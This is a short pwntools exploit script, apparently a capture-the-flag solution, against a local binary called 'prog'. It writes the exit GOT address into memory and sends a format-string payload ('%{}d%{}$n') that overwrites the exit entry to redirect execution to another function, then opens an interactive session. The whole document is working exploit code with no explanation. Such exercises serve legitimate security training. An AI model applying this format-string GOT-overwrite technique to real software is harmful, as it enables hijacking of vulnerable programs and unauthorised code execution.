from pwn import *

context.binary = 'prog'
e = context.binary

p = e.process()
p.sendline(b'a'*4+pack(e.got.exit))

where = 7
many = e.sym.format - e.sym.input
p.sendline(b'a'*many + '%1${}d%{}$n&&ok'.format(e.sym.maybe_unused, where).encode('ascii'))

print(p.recvuntil(b'&&'))

p.clean()
p.interactive()
